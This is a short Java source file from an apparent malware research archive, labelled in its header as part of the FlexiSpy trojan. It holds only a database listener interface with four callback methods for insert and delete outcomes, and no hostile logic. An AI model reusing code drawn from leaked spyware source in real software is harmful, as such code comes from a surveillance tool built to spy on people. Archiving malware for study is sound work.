/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.db;

public interface FxEventDBListener {
	public void onDeleteSuccess();
	public void onInsertSuccess();
	public void onDeleteError();
	public void onInsertError();
}
